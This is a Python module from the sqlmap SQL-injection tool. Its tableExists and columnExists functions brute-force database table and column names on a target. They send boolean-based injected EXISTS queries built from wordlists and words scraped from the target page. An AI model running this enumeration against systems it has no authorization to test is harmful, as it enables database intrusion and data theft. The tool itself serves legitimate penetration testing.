#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2011 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import threading
import time

from lib.core.common import clearConsoleLine
from lib.core.common import dataToSessionFile
from lib.core.common import dataToStdout
from lib.core.common import filterListValue
from lib.core.common import getFileItems
from lib.core.common import Backend
from lib.core.common import getPageTextWordsSet
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomInt
from lib.core.common import readInput
from lib.core.common import safeStringFormat
from lib.core.common import safeSQLIdentificatorNaming
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.exception import sqlmapMissingMandatoryOptionException
from lib.core.exception import sqlmapThreadException
from lib.core.settings import MAX_NUMBER_OF_THREADS
from lib.core.settings import METADB_SUFFIX
from lib.core.session import safeFormatString
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.request import inject

def tableExists(tableFile, regex=None):
    tables = getFileItems(tableFile, lowercase=Backend.getIdentifiedDbms() in (DBMS.ACCESS), unique=True)

    infoMsg = "checking table existence using items from '%s'" % tableFile
    logger.info(infoMsg)

    infoMsg = "adding words used on web page to the check list"
    logger.info(infoMsg)
    pageWords = getPageTextWordsSet(kb.originalPage)

    for word in pageWords:
        word = word.lower()

        if len(word) > 2 and not word[0].isdigit() and word not in tables:
            tables.append(word)

    tables = filterListValue(tables, regex)

    threadData = getCurrentThreadData()
    threadData.shared.count = 0
    threadData.shared.limit = len(tables)
    threadData.shared.outputs = []
    threadData.shared.unique = set()

    def tableExistsThread():
        threadData = getCurrentThreadData()

        while kb.threadContinue:
            kb.locks.countLock.acquire()
            if threadData.shared.count < threadData.shared.limit:
                table = safeSQLIdentificatorNaming(tables[threadData.shared.count], True)
                threadData.shared.count += 1
                kb.locks.countLock.release()
            else:
                kb.locks.countLock.release()
                break

            if conf.db and METADB_SUFFIX not in conf.db:
                fullTableName = "%s%s%s" % (conf.db, '..' if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) else '.', table)
            else:
                fullTableName = table

            result = inject.checkBooleanExpression("%s" % safeStringFormat("EXISTS(SELECT %d FROM %s)", (randomInt(1), fullTableName)))

            kb.locks.ioLock.acquire()

            if result and table.lower() not in threadData.shared.unique:
                threadData.shared.outputs.append(table)

                threadData.shared.unique.add(table.lower())

                dataToSessionFile("[%s][%s][%s][TABLE_EXISTS][%s]\n" % (conf.url,\
                  kb.injection.place, safeFormatString(conf.parameters[kb.injection.place]),\
                  safeFormatString(fullTableName)))

                if conf.verbose in (1, 2):
                    clearConsoleLine(True)
                    infoMsg = "[%s] [INFO] retrieved: %s\r\n" % (time.strftime("%X"), table)
                    dataToStdout(infoMsg, True)

            if conf.verbose in (1, 2):
                status = '%d/%d items (%d%s)' % (threadData.shared.count, threadData.shared.limit, round(100.0*threadData.shared.count/threadData.shared.limit), '%')
                dataToStdout("\r[%s] [INFO] tried %s" % (time.strftime("%X"), status), True)

            kb.locks.ioLock.release()

    try:
        runThreads(conf.threads, tableExistsThread, threadChoice=True)

    except KeyboardInterrupt:
        warnMsg = "user aborted during table existence "
        warnMsg += "check. sqlmap will display partial output"
        logger.warn(warnMsg)

    clearConsoleLine(True)
    dataToStdout("\n")

    if not threadData.shared.outputs:
        warnMsg = "no table(s) found"
        logger.warn(warnMsg)
    else:
        for item in threadData.shared.outputs:
            if not kb.data.cachedTables.has_key(conf.db):
                kb.data.cachedTables[conf.db] = [item]
            else:
                kb.data.cachedTables[conf.db].append(item)

    return kb.data.cachedTables

def columnExists(columnFile, regex=None):
    if not conf.tbl:
        errMsg = "missing table parameter"
        raise sqlmapMissingMandatoryOptionException, errMsg

    columns = getFileItems(columnFile, unique=True)
    columns = filterListValue(columns, regex)

    if conf.db and METADB_SUFFIX not in conf.db:
        table = "%s%s%s" % (conf.db, '..' if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) else '.', conf.tbl)
    else:
        table = conf.tbl
    table = safeSQLIdentificatorNaming(table, True)

    infoMsg = "checking column existence using items from '%s'" % columnFile
    logger.info(infoMsg)

    kb.threadContinue = True
    kb.bruteMode = True

    threadData = getCurrentThreadData()
    threadData.shared.count = 0
    threadData.shared.limit = len(columns)
    threadData.shared.outputs = []

    def columnExistsThread():
        threadData = getCurrentThreadData()

        while kb.threadContinue:
            kb.locks.countLock.acquire()
            if threadData.shared.count < threadData.shared.limit:
                column = safeSQLIdentificatorNaming(columns[threadData.shared.count])
                threadData.shared.count += 1
                kb.locks.countLock.release()
            else:
                kb.locks.countLock.release()
                break

            result = inject.checkBooleanExpression("%s" % safeStringFormat("EXISTS(SELECT %s FROM %s)", (column, table)))

            kb.locks.ioLock.acquire()

            if result:
                threadData.shared.outputs.append(column)

                if conf.verbose in (1, 2):
                    clearConsoleLine(True)
                    infoMsg = "[%s] [INFO] retrieved: %s\r\n" % (time.strftime("%X"), column)
                    dataToStdout(infoMsg, True)

            if conf.verbose in (1, 2):
                status = '%d/%d items (%d%s)' % (threadData.shared.count, threadData.shared.limit, round(100.0*threadData.shared.count/threadData.shared.limit), '%')
                dataToStdout("\r[%s] [INFO] tried %s" % (time.strftime("%X"), status), True)

            kb.locks.ioLock.release()

    try:
        runThreads(conf.threads, columnExistsThread, threadChoice=True)

    except KeyboardInterrupt:
        warnMsg = "user aborted during column existence "
        warnMsg += "check. sqlmap will display partial output"
        logger.warn(warnMsg)

    clearConsoleLine(True)
    dataToStdout("\n")

    if not threadData.shared.outputs:
        warnMsg = "no column(s) found"
        logger.warn(warnMsg)
    else:
        columns = {}

        for column in threadData.shared.outputs:
            result = inject.checkBooleanExpression("%s" % safeStringFormat("EXISTS(SELECT %s FROM %s WHERE ROUND(%s)=ROUND(%s))", (column, table, column, column)))

            if result:
                columns[column] = 'numeric'
            else:
                columns[column] = 'non-numeric'

            dataToSessionFile("[%s][%s][%s][COLUMN_EXISTS][%s|%s %s]\n" % (conf.url, kb.injection.place,\
              safeFormatString(conf.parameters[kb.injection.place]), safeFormatString(table),\
              safeFormatString(column), safeFormatString(columns[column])))

        kb.data.cachedColumns[conf.db] = {conf.tbl: columns}

    return kb.data.cachedColumns
